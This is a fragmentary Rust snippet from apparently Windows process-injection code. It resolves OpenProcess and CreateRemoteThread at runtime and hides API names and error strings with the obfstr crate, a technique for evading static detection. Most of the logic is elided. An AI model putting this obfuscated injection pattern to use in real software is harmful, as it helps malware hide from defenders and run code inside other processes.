...
use obfstr::{obfbytes, obfstr};
    ...
    let p_open_process = get_proc_address(kernel32, obfbytes!(b"OpenProcess\0").as_slice())?;
    ...
    let p_create_remote_thread = get_proc_address(kernel32, obfbytes!(b"CreateRemoteThread\0").as_slice())?;
    ...
    if h_process.is_null() {
        return Err(obfstr!("OpenProcess failed").to_string());
    }
    ...
    if h_thread.is_null() {
        close_handle(h_process);
        return Err(obfstr!("CreateRemoteThread failed").to_string());
    }
